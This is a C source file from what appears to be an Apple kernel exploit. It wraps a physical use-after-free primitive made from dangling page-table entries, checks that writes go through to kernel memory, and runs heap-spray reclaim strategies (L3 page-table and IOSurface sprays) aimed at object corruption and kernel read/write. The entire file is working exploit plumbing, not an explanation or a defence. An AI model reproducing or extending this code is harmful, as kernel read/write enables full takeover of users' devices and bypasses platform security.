/*
 * pmap_core.c — pmap_tte_remove wrappers (prove + SPTM reclaim bridge)
 */

#include "pmap_core.h"
#include "pmap_puaf.h"
#include "pmap_reclaim.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>

static uint64_t ms_now(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000ULL + (uint64_t)ts.tv_nsec / 1000000ULL;
}

int pmap_run_prove(int nprove, pmap_prove_result_t *out)
{
    if (out) {
        memset(out, 0, sizeof(*out));
    }
    if (nprove < 1 || nprove > PMAP_PUAF_KEEP) {
        nprove = PMAP_PUAF_KEEP;
    }

    uint64_t t0 = ms_now();
    pmap_puaf_state_t puaf;
    if (pmap_puaf_create(&puaf) < 0) {
        if (out) {
            snprintf(out->error, sizeof(out->error), "PUAF creation failed");
        }
        return -1;
    }

    int confirmed = 0;
    int kernel_reads = 0;
    for (int i = 0; i < nprove && i < puaf.dangling_ptes; i++) {
        volatile uint64_t *p64 = (volatile uint64_t *)puaf.maps[i];
        volatile unsigned char *p8 = (volatile unsigned char *)puaf.maps[i];

        uint64_t pte_val = *p64;
        int looks_like_pte = ((pte_val & 3) == 3) && ((pte_val >> 12) != 0);
        int not_sentinel = (pte_val != 0x4141414141414141ULL) && (pte_val != 0);
        if (looks_like_pte || not_sentinel) {
            kernel_reads++;
        }

        *p8 = 0xBB;
        if (*p8 == 0xBB) {
            confirmed++;
        }
    }

    if (out) {
        out->overflow_ok = 1;
        out->mappings_created = puaf.mappings_created;
        out->dangling_ptes = puaf.dangling_ptes;
        out->kernel_reads = kernel_reads;
        out->write_confirmed = confirmed;
        out->prove_attempts = nprove;
        out->puaf_ready = (confirmed > 0) ? 1 : 0;
        out->elapsed_ms = ms_now() - t0;

        if (confirmed > 0 && kernel_reads > 0) {
            snprintf(out->verdict, sizeof(out->verdict),
                     "PUAF CONFIRMED — %d/%d write-through, %d kernel PTE reads",
                     confirmed, nprove, kernel_reads);
        } else if (confirmed > 0) {
            snprintf(out->verdict, sizeof(out->verdict),
                     "WRITE CONFIRMED — %d/%d (reads raced with zeroing)", confirmed, nprove);
        } else {
            snprintf(out->verdict, sizeof(out->verdict),
                     "0 CONFIRMED — patched or page zeroed before access");
        }
    }

    pmap_puaf_destroy(&puaf);
    return confirmed;
}

int pmap_run_reclaim(const pmap_reclaim_config_t *cfg, pmap_prove_result_t *out)
{
    if (!cfg || !out) {
        return -1;
    }

    memset(out, 0, sizeof(*out));
    uint64_t t0 = ms_now();

    pmap_reclaim_config_t reclaim_cfg;
    memset(&reclaim_cfg, 0, sizeof(reclaim_cfg));
    reclaim_cfg.spray_count = cfg->spray_count > 0 ? cfg->spray_count : 1024;
    reclaim_cfg.max_retries = cfg->max_retries > 0 ? cfg->max_retries : 5;
    reclaim_cfg.try_l3_spray = cfg->try_l3_spray;
    reclaim_cfg.try_iosurface = cfg->try_iosurface;
    if (!reclaim_cfg.try_l3_spray && !reclaim_cfg.try_iosurface) {
        reclaim_cfg.try_l3_spray = 1;
        reclaim_cfg.try_iosurface = 1;
    }

    pmap_reclaim_result_t reclaim;
    int rc = pmap_reclaim_execute(&reclaim_cfg, &reclaim);

    out->overflow_ok = 1;
    out->mappings_created = PMAP_PUAF_OVERFLOW;
    out->dangling_ptes = PMAP_PUAF_KEEP;
    out->write_confirmed = reclaim.write_through;
    out->prove_attempts = PMAP_PUAF_KEEP;
    out->puaf_ready = (reclaim.write_through > 0) ? 1 : 0;
    out->reclaim_ready = reclaim.reclaim_ready;
    out->object_corrupt_ready = reclaim.object_corrupt_ready;
    out->krw_ready = reclaim.krw_ready;
    snprintf(out->reclaim_strategy, sizeof(out->reclaim_strategy), "%s", reclaim.strategy_name);
    out->l3_faults = reclaim.l3_faults;
    out->l3_changed = reclaim.l3_changed;
    out->iosurface_hits = reclaim.iosurface_hits;
    out->spray_count = reclaim.spray_count;
    out->retry_attempts = reclaim.retry_attempts;
    out->elapsed_ms = ms_now() - t0;
    snprintf(out->verdict, sizeof(out->verdict), "%s", reclaim.verdict);
    if (reclaim.error[0]) {
        snprintf(out->error, sizeof(out->error), "%s", reclaim.error);
    }

    return rc;
}
